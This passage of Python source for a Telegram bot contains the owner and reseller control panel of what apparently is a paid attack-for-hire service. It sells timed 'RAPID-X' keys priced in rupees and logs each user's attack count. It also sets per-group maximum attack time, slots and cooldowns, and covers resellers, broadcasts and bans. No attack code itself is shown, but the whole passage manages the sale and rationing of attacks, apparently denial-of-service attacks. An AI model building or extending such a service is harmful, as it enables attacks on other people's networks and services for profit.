            response += f"│    {pe('money','💰')} PRICE: {price} Rs\n"
            response += f"│    {pe('profile','👤')} CREATED BY: {created_by}\n"
            response += f"│    {pe('tag','🏷️')} CREATOR TYPE: {creator_type.upper()}\n"
            response += f"│    {pe('calendar','📅')} CREATED: {key.get('created_at', 'N/A')}\n"
            response += f"│    ──────────────────────────────────────────────────────────────\n"
            response += f"│    {pe('profile','👤')} USED BY: {used_by}\n"
            response += f"│    {pe('profile','📛')} USERNAME: {username}\n"
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"│    {pe('hourglass','⏳')} TIME LEFT: {remaining}\n"
                    response += f"│    {pe('check','✅')} STATUS: ACTIVE\n"
                else:
                    response += f"│    {pe('warning','⚠️')} STATUS: EXPIRED\n"
            response += f"│    {pe('calendar','📅')} USED AT: {key.get('used_at', 'N/A')}\n"
            response += f"└────────────────────────────────────────────────────────────────┘\n\n"
            
    if not all_keys:
        response += f"{pe('letter','📭')} Nᴏ ᴋᴇʏꜱ ꜰᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀꜱᴇ!\n"
        
    total_value = 0
    for k in all_keys:
        total_value += get_key_price(k.get('key_type', 'NORMAL'), k.get('duration_label', ''))
        
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"{pe('chart','📊')} SUMMARY:\n"
    response += f"   {pe('lock','🔑')} TOTAL KEYS: {len(all_keys)}\n"
    response += f"   {pe('check','🟢')} UNUSED: {len(unused_keys)}\n"
    response += f"   {pe('cross','🔴')} USED: {len(used_keys)}\n"
    response += f"   {pe('money','💰')} TOTAL VALUE: {total_value} Rs\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    
    if not all_users:
        safe_send_message(message.chat.id, f"{pe('letter','📋')} Nᴏ ᴜꜱᴇʀꜱ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    active_users = []
    expired_users = []
    
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
            
    response = "════════════════════════════════════════════════════════════════\n"
    response += f"                          {pe('profile','👥')} ALL USERS REPORT\n"
    response += f"                     Generated: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
    response += "════════════════════════════════════════════════════════════════\n\n"
    
    response += f"{pe('check','🟢')} ACTIVE USERS ({len(active_users)})\n"
    response += "────────────────────────────────────────────────────────────────\n"
    
    for i, user in enumerate(active_users, 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}ᴅ {hours}ʜ {minutes}ᴍ"
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')
        response += f"{i}. {pe('profile','👤')} {user.get('username', 'Unknown')}\n"
        response += f"   {pe('profile','🆔')} ID: {user['user_id']}\n"
        response += f"   {pe('lock','🔑')} KEY: {user.get('key', 'N/A')}\n"
        response += f"   {pe('star','⭐')} TYPE: {key_type}\n"
        response += f"   {pe('timer','⏰')} DURATION: {user.get('key_duration_label', 'N/A')}\n"
        response += f"   {pe('hourglass','⏳')} TIME LEFT: {time_str}\n"
        response += f"   {pe('calendar','📅')} EXPIRES: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        response += f"   {pe('sword','⚔️')} TOTAL ATTACKS: {attack_count}\n"
        if user.get('reseller_username'):
            response += f"   {pe('briefcase','💼')} RESELLER: @{user['reseller_username']}\n"
        response += "\n"
        
    if not active_users:
        response += f"   {pe('letter','📭')} Nᴏ ᴀᴄᴛɪᴠᴇ ᴜꜱᴇʀꜱ\n\n"
        
    response += f"\n{pe('cross','🔴')} EXPIRED USERS ({len(expired_users)})\n"
    response += "────────────────────────────────────────────────────────────────\n"
    
    for i, user in enumerate(expired_users, 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        key_type = user.get('key_type', 'NORMAL')
        response += f"{i}. {pe('profile','👤')} {user.get('username', 'Unknown')}\n"
        response += f"   {pe('profile','🆔')} ID: {user['user_id']}\n"
        response += f"   {pe('lock','🔑')} KEY: {user.get('key', 'N/A')}\n"
        response += f"   {pe('star','⭐')} TYPE: {key_type}\n"
        if user.get('key_expiry'):
            response += f"   {pe('calendar','📅')} EXPIRED: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        response += f"   {pe('sword','⚔️')} TOTAL ATTACKS: {attack_count}\n"
        response += "\n"
        
    if not expired_users:
        response += f"   {pe('letter','📭')} Nᴏ ᴇxᴘɪʀᴇᴅ ᴜꜱᴇʀꜱ\n"
        
    response += "\n════════════════════════════════════════════════════════════════\n"
    response += f"{pe('chart','📊')} TOTAL: {len(active_users)} ACTIVE | {len(expired_users)} EXPIRED\n"
    response += "════════════════════════════════════════════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["delexpkey"])
def del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []
    
    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)
            
    if not expired_keys:
        safe_send_message(message.chat.id, f"{pe('check','✅')} Nᴏ ᴇxᴘɪʀᴇᴅ ᴋᴇʏꜱ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    pending_del_exp_key[user_id] = expired_keys
    
    safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Fᴏᴜɴᴅ {len(expired_keys)} ᴇxᴘɪʀᴇᴅ ᴋᴇʏꜱ!\n\nTʏᴘᴇ /confirm_delexpkey ᴛᴏ ᴄᴏɴꜰɪʀᴍ.\nTʏᴘᴇ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ.", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["confirm_delexpkey"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Fɪʀꜱᴛ ᴜꜱᴇ /delexpkey!", reply_to=message, parse_mode="HTML")
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
        except:
            pass
            
    safe_send_message(message.chat.id, f"{pe('check','✅')} {deleted_count} ᴇxᴘɪʀᴇᴅ ᴋᴇʏꜱ ᴅᴇʟᴇᴛᴇᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["trail"])
def trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /trail <ʜᴏᴜʀꜱ> <ᴍᴀx_ᴜꜱᴇʀꜱ>\n\nExᴀᴍᴘʟᴇ: /trail 1 10 (1 ʜᴏᴜʀ ᴋᴇʏ ꜰᴏʀ 10 ᴜꜱᴇʀꜱ)", reply_to=message, parse_mode="HTML")
        return
    
    try:
        hours = int(command_parts[1])
        max_users = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ʜᴏᴜʀꜱ ᴏʀ ᴍᴀx_ᴜꜱᴇʀꜱ!", reply_to=message, parse_mode="HTML")
        return
    
    key = f"RAPID-X-{generate_key('TRAIL')}"
    
    key_doc = {
        'key': key,
        'duration_seconds': hours * 3600,
        'duration_label': f"{hours} ʜᴏᴜʀꜱ (Tʀᴀɪʟ)",
        'created_at': datetime.now(),
        'created_by': user_id,
        'created_by_type': 'owner',
        'used': False,
        'used_by': None,
        'used_at': None,
        'max_users': max_users,
        'current_users': 0,
        'is_trail': True,
        'key_type': 'NORMAL',
        'max_attack_time': 300
    }
    
    keys_collection.insert_one(key_doc)
    
    safe_send_message(message.chat.id, f"{pe('check','✅')} Tʀᴀɪʟ Kᴇʏ Gᴇɴᴇʀᴀᴛᴇᴅ!\n\n{pe('lock','🔑')} Kᴇʏ: <code>{key}</code>\n{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {hours} ʜᴏᴜʀꜱ\n{pe('profile','👥')} Mᴀx Usᴇʀꜱ: {max_users}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{pe('warning','⚠️')} Usᴀɢᴇ: /addgrp <ɴᴀᴍᴇ> <ɢʀᴏᴜᴘ_ɪᴅ> <ᴅᴀʏꜱ>\n\nExᴀᴍᴘʟᴇ: /addgrp Tᴇꜱᴛɢʀᴏᴜᴘ -100123456789 30", parse_mode="HTML")
        return
    
    name = command_parts[1]
    group_id = command_parts[2]
    
    try:
        days = int(command_parts[3])
        expiry_date = datetime.now() + timedelta(days=days)
        
        group_data = {
            'name': name,
            'group_id': group_id,
            'added_by': user_id,
            'added_at': datetime.now(),
            'expiry_date': expiry_date,
            'max_attack_time': get_max_attack_time(),
            'max_slots': current_max_slots,
            'cooldown': get_user_cooldown_setting(),
            'feedback_required': get_setting('feedback_required', True)
        }
        
        approved_groups_collection.update_one(
            {'group_id': group_id},
            {'$set': group_data},
            upsert=True
        )
        
        bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ <b>{name}</b> ᴀᴘᴘʀᴏᴠᴇᴅ!\n\n{pe('chart','📊')} Gʀᴏᴜᴘ ID: <code>{group_id}</code>\n{pe('timer','⏰')} Vᴀʟɪᴅ ꜰᴏʀ: {days} ᴅᴀʏꜱ\n{pe('calendar','📅')} Exᴘɪʀᴇꜱ: {expiry_date.strftime('%d-%m-%Y')}\n\n{pe('gear','⚙️')} Dᴇꜰᴀᴜʟᴛ Sᴇᴛᴛɪɴɢꜱ:\n★ Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ: {group_data['max_attack_time']}ꜱ\n★ Mᴀx Sʟᴏᴛꜱ: {group_data['max_slots']}\n★ Cᴏᴏʟᴅᴏᴡɴ: {group_data['cooldown']}ꜱ\n★ Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ: {'ON' if group_data['feedback_required'] else 'OFF'}", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴅᴀʏꜱ ᴠᴀʟᴜᴇ!", parse_mode="HTML")

@bot.message_handler(commands=["delgrp"])
def del_group_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{pe('warning','⚠️')} Usᴀɢᴇ: /delgrp <ɴᴀᴍᴇ>\n\nUsᴇ /grpinfo ᴛᴏ ꜱᴇᴇ ɢʀᴏᴜᴘ ɴᴀᴍᴇꜱ.", parse_mode="HTML")
        return
    
    name = command_parts[1]
    
    result = approved_groups_collection.delete_one({'name': name})
    
    if result.deleted_count > 0:
        bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ <b>{name}</b> ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴀᴘᴘʀᴏᴠᴇᴅ ʟɪꜱᴛ!", parse_mode="HTML")
    else:
        bot.reply_to(message, f"{pe('cross','❌')} Gʀᴏᴜᴘ <b>{name}</b> ɴᴏᴛ ꜰᴏᴜɴᴅ!", parse_mode="HTML")

@bot.message_handler(commands=["grpinfo"])
def group_info_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    groups = list(approved_groups_collection.find())
    
    if not groups:
        bot.reply_to(message, f"{pe('letter','📋')} Nᴏ ᴀᴘᴘʀᴏᴠᴇᴅ ɢʀᴏᴜᴘꜱ ꜰᴏᴜɴᴅ!", parse_mode="HTML")
        return
    
    response = "════════════════════════════════════════════════════════════════\n"
    response += f"                        {pe('briefcase','👥')} APPROVED GROUPS\n"
    response += "════════════════════════════════════════════════════════════════\n\n"
    
    for i, group in enumerate(groups, 1):
        status = f"{pe('check','✅')} Aᴄᴛɪᴠᴇ" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else f"{pe('cross','🔴')} Exᴘɪʀᴇᴅ"
        response += f"{i}. <b>{group.get('name', 'Unknown')}</b>\n"
        response += f"   {pe('target','📱')} Gʀᴏᴜᴘ ID: <code>{group['group_id']}</code>\n"
        response += f"   {pe('chart','📊')} Sᴛᴀᴛᴜꜱ: {status}\n"
        response += f"   {pe('gear','⚙️')} Mᴀx Tɪᴍᴇ: {group.get('max_attack_time', get_max_attack_time())}ꜱ\n"
        response += f"   {pe('target','🎯')} Mᴀx Sʟᴏᴛꜱ: {group.get('max_slots', current_max_slots)}\n"
        response += f"   {pe('hourglass','⏳')} Cᴏᴏʟᴅᴏᴡɴ: {group.get('cooldown', get_user_cooldown_setting())}ꜱ\n"
        response += f"   {pe('camera','📸')} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ: {'ON' if group.get('feedback_required', get_setting('feedback_required', True)) else 'OFF'}\n"
        if group.get('expiry_date'):
            response += f"   {pe('calendar','📅')} Exᴘɪʀᴇꜱ: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
        response += "\n"
        
    response += "════════════════════════════════════════════════════════════════"
    
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /broadcast <ᴍᴇꜱꜱᴀɢᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    broadcast_msg = command_parts[1]
    
    all_users = list(users_collection.find())
    all_resellers = list(resellers_collection.find())
    all_bot_users = list(bot_users_collection.find())
    
    all_user_ids = set()
    for u in all_users:
        all_user_ids.add(u['user_id'])
    for r in all_resellers:
        all_user_ids.add(r['user_id'])
    for bu in all_bot_users:
        all_user_ids.add(bu['user_id'])
        
    sent_count = 0
    failed_count = 0
    
    for uid in all_user_ids:
        try:
            bot.send_message(uid, f"{pe('announcement','📢')} Bʀᴏᴀᴅᴄᴀꜱᴛ\n\n{broadcast_msg}", parse_mode="HTML")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
            
    safe_send_message(message.chat.id, f"{pe('check','✅')} Bʀᴏᴀᴅᴄᴀꜱᴛ Sᴇɴᴛ!\n\n{pe('letter','📨')} Tᴏᴛᴀʟ: {len(all_user_ids)}\n{pe('check','✅')} Dᴇʟɪᴠᴇʀᴇᴅ: {sent_count}\n{pe('cross','❌')} Fᴀɪʟᴇᴅ: {failed_count}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["broadcastreseller"])
def broadcast_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /broadcastreseller <ᴍᴇꜱꜱᴀɢᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    broadcast_msg = command_parts[1]
    
    resellers = list(resellers_collection.find())
    reseller_ids = set(r['user_id'] for r in resellers)
    
    sent_count = 0
    failed_count = 0
    
    for uid in reseller_ids:
        try:
            bot.send_message(uid, f"{pe('announcement','📢')} Rᴇꜱᴇʟʟᴇʀ Nᴏᴛɪᴄᴇ\n\n{broadcast_msg}", parse_mode="HTML")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
            
    safe_send_message(message.chat.id, f"{pe('check','✅')} Rᴇꜱᴇʟʟᴇʀ Bʀᴏᴀᴅᴄᴀꜱᴛ Sᴇɴᴛ!\n\n{pe('letter','📨')} Tᴏᴛᴀʟ: {len(reseller_ids)}\n{pe('check','✅')} Dᴇʟɪᴠᴇʀᴇᴅ: {sent_count}\n{pe('cross','❌')} Fᴀɪʟᴇᴅ: {failed_count}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["broadcastpaid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /broadcastpaid <ᴍᴇꜱꜱᴀɢᴇ>", reply_to=message, parse_mode="HTML")
        return
        
    broadcast_msg = command_parts[1]
    
    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))
    
    if not active_subscribers:
        safe_send_message(message.chat.id, f"{pe('letter','📋')} Nᴏ ᴀᴄᴛɪᴠᴇ ꜱᴜʙꜱᴄʀɪʙᴇʀꜱ ᴛᴏ ꜱᴇɴᴅ ᴍᴇꜱꜱᴀɢᴇ ᴛᴏ!", reply_to=message, parse_mode="HTML")
        return
        
    sent_count = 0
    fail_count = 0
    
    for user in active_subscribers:
        try:
            target_id = user['user_id']
            if is_owner(target_id):
                continue
            bot.send_message(target_id, f"{pe('diamond','💎')} Pᴀɪᴅ Usᴇʀ Aɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ\n\n{broadcast_msg}", parse_mode="HTML")
            sent_count += 1
            time.sleep(0.05)
        except Exception:
            fail_count += 1
            
    safe_send_message(message.chat.id, f"{pe('check','✅')} Bʀᴏᴀᴅᴄᴀꜱᴛ Cᴏᴍᴘʟᴇᴛᴇ!\n\n{pe('profile','👤')} Sᴇɴᴛ ᴛᴏ: {sent_count} ᴘᴀɪᴅ ᴜꜱᴇʀꜱ\n{pe('cross','❌')} Fᴀɪʟᴇᴅ: {fail_count}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /ban <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
        
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
        
    if is_owner(target_user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Cᴀɴɴᴏᴛ ʙᴀɴ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
        
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}},
        upsert=True
    )
    
    try:
        bot.send_message(target_user_id, f"{pe('ban','🚫')} Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ʙᴀɴɴᴇᴅ!", parse_mode="HTML")
    except:
        pass
        
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Usᴇʀ {display} ʙᴀɴɴᴇᴅ!\n{pe('profile','🆔')} ID: {target_user_id}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /unban <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
        
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
        
    result = users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': False}}
    )
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            bot.send_message(target_user_id, f"{pe('check','✅')} Yᴏᴜʀ ʙᴀɴ ʜᴀꜱ ʙᴇᴇɴ ʟɪꜰᴛᴇᴅ!", parse_mode="HTML")
        except:
            pass
        safe_send_message(message.chat.id, f"{pe('check','✅')} Usᴇʀ {display} ᴜɴʙᴀɴɴᴇᴅ!\n{pe('profile','🆔')} ID: {target_user_id}", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ᴏʀ ᴀʟʀᴇᴀᴅʏ ᴜɴʙᴀɴɴᴇᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
        
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /tban <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ> <ᴛɪᴍᴇ>\nExᴀᴍᴘʟᴇ: /tban 123456 10m", reply_to=message, parse_mode="HTML")
        return
        
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
        
    if is_owner(target_user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Cᴀɴɴᴏᴛ ʙᴀɴ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ ꜰᴏʀᴍᴀᴛ! Usᴇ: 10m, 1h, 1d ᴇᴛᴄ.", reply_to=message, parse_mode="HTML")
        return
        
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}},
        upsert=True
    )
    
    safe_send_message(message.chat.id, f"{pe('ban','🚫')} Usᴇʀ {resolved_name or target_user_id} ʜᴀꜱ ʙᴇᴇɴ ʙᴀɴɴᴇᴅ ꜰᴏʀ {label}!\n{pe('hourglass','⏳')} Exᴘɪʀʏ: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if not is_owner(user_id) and not reseller:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴏᴡɴᴇʀ/ʀᴇꜱᴇʟʟᴇʀ!", reply_to=message, parse_mode="HTML")
        return
        
    if reseller and reseller.get('blocked'):
        safe_send_message(message.chat.id, f"{pe('ban','🚫')} Yᴏᴜʀ ᴘᴀɴᴇʟ ɪꜱ ʙʟᴏᴄᴋᴇᴅ!", reply_to=message, parse_mode="HTML")
        return
        
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⭐ VIP Kᴇʏ", callback_data="keytype_vip"),
        InlineKeyboardButton("📀 NORMAL Kᴇʏ", callback_data="keytype_normal")
    )
    
    bot.reply_to(message, f"{pe('lock','🔑')} <b>Sᴇʟᴇᴄᴛ Kᴇʏ Tʏᴘᴇ</b>\n\nCʜᴏᴏꜱᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏꜰ ᴋᴇʏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ:", reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("keytype_"))
def key_type_callback(call):
    bot.answer_callback_query(call.id)
    user_id = call.from_user.id
    
    if not is_owner(user_id) and not get_reseller(user_id):
        bot.send_message(call.message.chat.id, f"{pe('cross','❌')} Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!", parse_mode="HTML")
        return
        
    key_type = call.data.replace("keytype_", "").upper()
    
    temp_key_gen[user_id] = {'key_type': key_type}
    
    duration_options = ['2h', '6h', '12h'] + [f'{i}d' for i in range(1, 31)]
    
    markup = InlineKeyboardMarkup(row_width=3)
    for dur in duration_options:
        label = DURATION_LABELS.get(dur, dur)
        markup.add(InlineKeyboardButton(label, callback_data=f"duration_{dur}"))
        
    bot.edit_message_text(
        f"{pe('check','✅')} Sᴇʟᴇᴄᴛᴇᴅ: <b>{key_type} Kᴇʏ</b>\n\n"
        f"{pe('pencil','📝')} Nᴏᴡ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴜʀᴀᴛɪᴏɴ:",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=markup,
